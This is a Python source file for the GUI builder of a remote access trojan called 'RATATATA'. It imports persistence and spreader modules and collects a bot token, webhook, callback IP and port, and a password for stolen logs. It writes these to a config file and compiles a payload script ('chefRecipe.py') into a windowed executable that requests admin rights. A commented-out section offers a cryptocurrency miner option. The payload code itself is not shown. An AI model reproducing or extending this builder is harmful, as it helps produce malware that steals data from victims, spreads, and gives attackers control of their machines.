import dearpygui.dearpygui as dpg
import random
from tkinter import filedialog
import threading
import os
import time
import persistence
import Spreader
import webbrowser
import configparser
import subprocess
import pyminizip
import tempfile
dpg.create_context()



def usagecallback():
    fpath = os.path.join("usage", "index.html")
    webbrowser.open(f"file://{os.path.abspath(fpath)}")
    
with dpg.font_registry():
    # Example: loading a TTF font file, adjust the path accordingly
    my_font = dpg.add_font("FUTULT.TTF", 22)  # Adjust size as needed
    dpg.bind_font(my_font)

def addpassonlog(sender, app_data):

    if app_data:
        dpg.show_item("logpasses")
        dpg.show_item("czip")
        dpg.set_item_pos("logpasses",(10,264))
        dpg.set_item_pos("czip",(10,295))
    else:
        dpg.hide_item("czip")
        dpg.hide_item("logpasses")

def mowncb(sender, app_data):
    if app_data:
        dpg.show_item("sexinput")
        dpg.show_item("botsexinput")
        dpg.set_item_pos("sexinput",(189,264))
        dpg.set_item_pos("botsexinput",(189,295))
    else:
        dpg.hide_item("sexinput")
        dpg.hide_item("botsexinput")
        
def portcb(sender,app_data):
    if app_data:
        dpg.show_item("portipinp")
        dpg.show_item("portportinp")
        dpg.set_item_pos("portipinp",(368,264))
        dpg.set_item_pos("portportinp",(368,295))
    else:
        dpg.hide_item("portipinp")
        dpg.hide_item("portportinp")

def create_zip_with_temp_files(zip_name, files_content, password):
    temp_files = []
    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            for content in files_content:
                temp_file = os.path.join(temp_dir, content['name'])
                with open(temp_file, 'wb') as f:
                    f.write(content['content'])
                    temp_files.append(temp_file) 

            zip_path = os.path.join(os.environ['TEMP'], zip_name)
            pyminizip.compress_multiple(temp_files, [], zip_path, password, 0)
            print(f"{zip_path} oluşturuldu.")

        except Exception as e:
            print(f"Hata: {e}")   

def createzip(sender, app_data):
    getpass = dpg.get_value("logpasses")

    if len(getpass) >= 1:  
        zipname = "SecureFiles.zip"
        password = getpass

        files_content = [
            {'name': 'deneme1.txt', 'content': b'deneme1\n'},
            {'name': 'deneme2.txt', 'content': b'deneme2\n'},
        ]
        
        create_zip_with_temp_files(zipname, files_content, password)

with dpg.theme() as rounded_button_theme:
    with dpg.theme_component(dpg.mvButton):
        # Set rounded corners for the button
        dpg.add_theme_color(dpg.mvThemeCol_TitleBgActive, (60, 60, 60), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_TitleBg, (60, 60, 60), category=dpg.mvThemeCat_Core)
        dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 6, category=dpg.mvThemeCat_Core) 
        dpg.add_theme_style(dpg.mvStyleVar_FrameBorderSize, 1, category=dpg.mvThemeCat_Core) 

def chngmenu():
    dpg.show_style_editor()
    dpg.show_about()


is_token_valid = True
def buildcb():
    global is_token_valid  
    if not dpg.does_item_exist("Build"):
        with dpg.window(label="         'Our Choices Can Sometimes Change Our Lives' ", tag="Build", width=470, height=141, no_resize=True, modal=True, no_collapse=True):
            dpg.set_item_pos("Build", (32, 118))
            dpg.add_text("Are you sure about your choices", tag="texst")
            dpg.set_item_pos("texst", (109, 45))
            
          
            if not dpg.does_item_exist("bottoken"):
                dpg.add_input_text(tag="bottoken", label="Bot Token")
            
            dpg.add_button(label="Yes", tag="ybt", width=69, callback=lambda: check_token_and_confirm())
            dpg.set_item_pos("ybt", (145, 78))
            dpg.add_button(label="No", tag="nbt", width=72)
            dpg.set_item_pos("nbt", (230, 78))
            dpg.bind_item_theme("Build", window_theme)
    else:
        dpg.show_item("Build")
        dpg.bind_item_theme("Build", window_theme)


def check_token_and_confirm():
    global is_token_valid
    charsize = dpg.get_value("bottoken")
    print(f"Token Length: {len(charsize)}") 

    # Token kontrolü
    if len(charsize) < 59:
        is_token_valid = False 
        show_error_window() 
    else:
        is_token_valid = True 
        hide_error_window()  
      
        buildcheckforconfig()

def show_error_window():
    if not dpg.does_item_exist("charerrtkn"):
        with dpg.window(label="                      Error!", tag="charerrtkn", no_collapse=True, no_resize=True, width=253):
            dpg.set_item_pos("charerrtkn",(135,140))
            dpg.add_text("            Bot Token Length", parent="charerrtkn")
            dpg.add_text("      Can't Be S or L Than 59", parent="charerrtkn")
            dpg.bind_item_theme("charerrtkn", window_theme)
    else:
        dpg.show_item("charerrtkn") 

def hide_error_window():
    if dpg.does_item_exist("charerrtkn"):
        dpg.hide_item("charerrtkn")  
with dpg.window(tag="Primary Window"):
    with dpg.theme() as window_theme:
        with dpg.theme_component(dpg.mvWindowAppItem):
            # Set title bar color (replace the RGB values with your desired color)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBgActive, (60, 60, 60), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBg, (60, 60, 60), category=dpg.mvThemeCat_Core)
            # Add rounded corners to the window
            dpg.add_theme_style(dpg.mvStyleVar_WindowRounding, 10, category=dpg.mvThemeCat_Core)
            dpg.add_theme_style(dpg.mvStyleVar_FrameBorderSize, 1, category=dpg.mvThemeCat_Core)

    with dpg.theme() as buttonbg_theme:
            with dpg.theme_component(dpg.mvButton):
        # Set button background color
                dpg.add_theme_color(dpg.mvThemeCol_Button, (78, 148, 99), category=dpg.mvThemeCat_Core)
                dpg.add_theme_color(dpg.mvThemeCol_ButtonHovered, (103, 202, 103), category=dpg.mvThemeCat_Core)

    with dpg.theme() as checkmark_theme:
        with dpg.theme_component(dpg.mvCheckbox):
            dpg.add_theme_color(dpg.mvThemeCol_CheckMark, (0, 200, 16), category=dpg.mvThemeCat_Core)

    with dpg.theme() as frame_theme:
        with dpg.theme_component(dpg.mvAll):
            # Set frame border hovered color
            dpg.add_theme_color(dpg.mvThemeCol_FrameBgHovered, (55, 71, 65), category=dpg.mvThemeCat_Core)
            # Set frame background active color
            dpg.add_theme_color(dpg.mvThemeCol_FrameBgActive, (67, 70, 69), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_CheckMark, (0, 200, 16), category=dpg.mvThemeCat_Core)
            dpg.add_theme_style(dpg.mvStyleVar_FrameBorderSize, 1, category=dpg.mvThemeCat_Core)
            dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 8, category=dpg.mvThemeCat_Core)
            dpg.add_theme_style(dpg.mvStyleVar_WindowRounding, 10, category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBgActive, (60, 60, 60), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBg, (60, 60, 60), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_ButtonHovered, (55, 71, 65), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_ButtonActive, (67, 70, 69), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_HeaderHovered, (38, 156, 47), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBgActive, (60, 60, 60), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_TitleBg, (60, 60, 60), category=dpg.mvThemeCat_Core)
            dpg.add_theme_style(dpg.mvStyleVar_WindowRounding, 10, category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_BorderShadow, (94, 139, 114, 255), category=dpg.mvThemeCat_Core)
            dpg.add_theme_color(dpg.mvThemeCol_Border, (79, 79, 79, 255), category=dpg.mvThemeCat_Core)
            
      

    with dpg.viewport_menu_bar(show=True,tag="barsss"):
    
        dpg.add_menu_item(label="Usage",callback=usagecallback,tag="barusage")
        dpg.add_menu_item(label="Terminal")
        dpg.add_menu_item(label="Clear",show=True)
        #dpg.add_menu_item(label="Change Style",show=True,callback=chngmenu)
        dpg.bind_item_theme("barsss", frame_theme)
        
    
     
    dpg.add_text("RATATATA",indent=220,tag="maintext")
    dpg.set_item_pos("maintext",(12,48))


    multown=dpg.add_checkbox(label="Multi-Owner",tag="multown",callback=mowncb)
    dpg.set_item_pos("multown",(190,234))  
    dpg.add_input_text(label="",hint="Enter Your Bot Token", tag="botsexinput",width=166, show=False)
    dpg.add_input_text(label="",hint="Enter Your Webhook", tag="sexinput",width=166, show=False)
    dpg.set_item_pos("botsexinput",(12,305))
    dpg.set_item_pos("sexinput",(12,340))

    dpg.add_text("Client Setup",tag="clientset")
    dpg.set_item_pos("clientset",(220,105))
    btoken= dpg.add_input_text(label="",hint="Enter Your Bot Token", tag="bottoken",width=186)
    
    dpg.set_item_pos("bottoken",(173,140))
    dpg.get_value("bottoken")
    dpg.add_input_text(label="",hint="Enter Your Webhook", tag="whook",width=186)
    dpg.set_item_pos("whook",(173,175))
    

    dpg.add_checkbox(label="Pass On Logs",tag="askpass",callback=addpassonlog)
    passinip =dpg.add_input_text(label="",hint="Write Password", tag="logpasses",width=166, show=False)
    dpg.add_button(label="Set Pass", callback=createzip,tag="czip",show=False)
    dpg.set_item_pos("logpasses",(16,300))
    dpg.set_item_pos("askpass",(12,234))
    
    

    dpg.add_checkbox(label="Add Port System",tag="portsys",callback=portcb)
    dpg.set_item_pos("portsys",(368,234))
    dpg.add_input_text(label="",hint="Enter Your IP", tag="portipinp",width=166, show=False)
    dpg.add_input_text(label="",hint="Enter Your Port", tag="portportinp",width=166, show=False)
    dpg.set_item_pos("portipinp",(369,305))
    dpg.set_item_pos("portportinp",(369,340))


    """minerbut=dpg.add_checkbox(label="Miner",tag="miner", callback=miner_callback)
    with dpg.group(label="Gpu Or Cpu Mining?",tag="askminingtech",show=False):
       with dpg.tooltip(minerbut):
           dpg.add_text("Not Profitable")
           dpg.bind_item_theme("askminingtech",window_theme)
       gpuorcpu = dpg.add_radio_button(items=["GPU", "CPU"], tag="gpuorcpu")
       dpg.set_item_pos("miner",(343,378))
       dpg.set_item_pos("gpuorcpu",(292,311))"""
    

    dpg.add_button(label="Build",tag="createrat",width=120,height=40,callback=buildcb)
    dpg.set_item_pos("createrat",(210,370))
    dpg.bind_item_theme("createrat",buttonbg_theme)

def buildcheckforconfig():
    config = configparser.ConfigParser()


    config['Client'] = {}
    clientch = {
        "askpass": "PassOnLog",
        "portsys": "PortSys",
        "multown": "Mow",
    }

    for tag, name in clientch.items():
        if dpg.get_value(tag):
            config['Client'][name] = 'True'
            
    bottokenmain = dpg.get_value("bottoken")
    if bottokenmain:
        config['Client']['bt'] = bottokenmain

    whookmain = dpg.get_value("whook")
    if whookmain:
        config['Client']['wh'] = whookmain
    
    bottokenmultow = dpg.get_value("botsexinput")
    if bottokenmultow:
        config['Client']['mowbt'] = bottokenmultow

    whookmultow = dpg.get_value("sexinput")
    if whookmultow:
        config['Client']['mowwh '] = whookmultow

    portsetipin = dpg.get_value("portipinp")
    if portsetipin:
        config['Client']['IP'] = portsetipin
        
    portportinp = dpg.get_value("portportinp")
    if portportinp:
        config['Client']['PORT'] = portportinp


    with open('config.ini', 'w') as configfile:
        config.write(configfile)
        
    if not dpg.does_item_exist("compExe"):
        with dpg.window(label="                     Creating...",tag="compExe",no_collapse=True,no_resize=True,width=300,height=120,no_title_bar=True):
        
            dpg.set_item_pos("compExe",(240,260))
            dpg.add_text("                        Wait...")
            dpg.bind_item_theme("compExe",window_theme)
            

            getcurdir = os.getcwd()
            newdirname = "ForYou"
            newdirpath = os.path.join(getcurdir,newdirname)
       
            if not os.path.exists(newdirpath):
                os.makedirs(newdirpath)
            else:
                print("Klasör mevcut, devam ediliyor.")

            for file in os.listdir(newdirpath):
                if file.endswith(".exe"):
                    exe_path = os.path.join(newdirpath, file)
                    os.remove(exe_path)
                    print(f"{file} silindi.")
            
            #createshell = subprocess.Popen(f'start cmd /K "cd {getcurdir}"', shell=True)
            #subprocess.Popen(f'start cmd /K "pyinstaller --onefile --windowed --distpath {newdirpath} webhooktest.py"', shell=True)
            result = subprocess.run(
                ["pyinstaller", "--onefile", "--windowed", "--distpath", newdirpath, "--uac-admin","chefRecipe.py"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False
            )
           
           # time.sleep(5.1)
            if result.returncode == 0:
                with dpg.window(label="            Chef's Special Recipe Ready!",tag="exeCompiled",no_collapse=True,width=340,no_resize=True):               
                    dpg.hide_item("compExe")
                    dpg.set_item_pos("exeCompiled",(240,260)) 
                    dpg.add_text("       Now Just Check 'ForYou' Directory")
                    dpg.bind_item_theme("exeCompiled",window_theme) 
                    time.sleep(1.9)
                    os.startfile(newdirpath)
                    
                    
            else:
               with dpg.window(label="Failed!",tag="compFail"):
                   dpg.add_text("Failed To Create File",tag="failtext")

               print("Hata:", result.stderr.decode())

            dpg.hide_item("Build")    
            dpg.bind_item_theme("compExe",window_theme)
    else:

        dpg.hide_item("Build")          
        dpg.show_item("compExe")

dpg.bind_item_theme("Primary Window", frame_theme) 




dpg.create_viewport(
    title='RATATATA (BETA)', 
    width=560, 
    height=475, 
    resizable=False, 
    decorated=True, 
)
dpg.setup_dearpygui()
dpg.show_viewport()
dpg.set_primary_window("Primary Window", True)
dpg.start_dearpygui()
dpg.destroy_context()